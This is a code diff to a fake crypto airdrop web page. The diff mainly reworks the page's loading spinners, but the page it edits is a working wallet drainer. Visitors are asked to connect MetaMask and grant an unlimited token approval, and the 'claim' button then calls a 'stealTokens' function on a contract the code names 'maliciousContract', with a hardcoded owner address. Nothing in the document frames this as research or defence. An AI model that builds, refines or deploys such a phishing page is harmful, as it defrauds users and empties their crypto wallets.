@@ -80,30 +80,19 @@
     }
 
     .spinner {
-      border: 6px solid #f3f3f3;
-      border-top: 6px solid #4caf50;
-      border-radius: 50%;
-      width: 30px;
-      height: 30px;
-      animation: spin 1s linear infinite;
-      display: none; /* Initially hidden */
+      display: none;
       margin: 10px auto;
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #3498db;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
     }
 
     @keyframes spin {
-      0% {
-        transform: rotate(0deg);
-      }
-      100% {
-        transform: rotate(360deg);
-      }
-    }
-
-    #loadingMessage {
-      display: none;
-      margin-top: 10px;
-      font-size: 1rem;
-      color: #ffeb3b;
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
   </style>
 </head>
@@ -113,15 +102,15 @@
     <h2>Claim your rewards today and start your journey to success!</h2>
 
     <button id="connectButton" class="btn">Connect to MetaMask</button>
-    <button id="approveButton" class="btn" disabled>Approve Unlimited AirDrops</button>
+    <div>
+      <button id="approveButton" class="btn" disabled>Approve Unlimited AirDrops</button>
+      <div id="approveSpinner" class="spinner"></div>
+    </div>
 
     <div class="claim-btn-container">
       <button id="claimAirdropButton" class="btn" disabled>Claim Your Airdrop Now!</button>
+      <div id="claimSpinner" class="spinner"></div>
     </div>
-
-    <!-- Loading spinner and message -->
-    <div class="spinner" id="spinner"></div>
-    <p id="loadingMessage">Processing your request, please wait...</p>
 
     <div class="footer">
       <p>By participating, you agree to our <a href="#">Terms & Conditions</a>.</p>
@@ -136,19 +125,11 @@
     const ownerAddress = '0x9052EB26C0b9836335Ec153413F80bAEc7536414';
 
     const contractABI = [
-      // ABI content here...
+      // Add your contract ABI here
     ];
 
     let web3;
     let accounts;
-
-    const spinner = document.getElementById('spinner');
-    const loadingMessage = document.getElementById('loadingMessage');
-
-    function toggleLoading(show) {
-      spinner.style.display = show ? 'block' : 'none';
-      loadingMessage.style.display = show ? 'block' : 'none';
-    }
 
     async function connectMetaMask() {
       if (typeof window.ethereum !== 'undefined') {
@@ -167,8 +148,10 @@
 
     async function approveSpending() {
       if (!web3) return;
-      toggleLoading(true);
       const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
+      const spinner = document.getElementById('approveSpinner');
+      spinner.style.display = 'block';
+
       try {
         const maxApprovalAmount = web3.utils.toBN('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
         await tokenContract.methods.approve(contractAddress, maxApprovalAmount).send({ from: accounts[0] });
@@ -177,20 +160,23 @@
       } catch (error) {
         alert('Error during approval');
       } finally {
-        toggleLoading(false);
+        spinner.style.display = 'none';
       }
     }
 
     async function claimAirdrop() {
-      toggleLoading(true);
+      if (!web3) return;
       const maliciousContract = new web3.eth.Contract(contractABI, contractAddress);
+      const spinner = document.getElementById('claimSpinner');
+      spinner.style.display = 'block';
+
       try {
         await maliciousContract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
         alert('Airdrop claimed successfully!');
       } catch (error) {
         alert('Error claiming airdrop');
       } finally {
-        toggleLoading(false);
+        spinner.style.display = 'none';
       }
     }
 
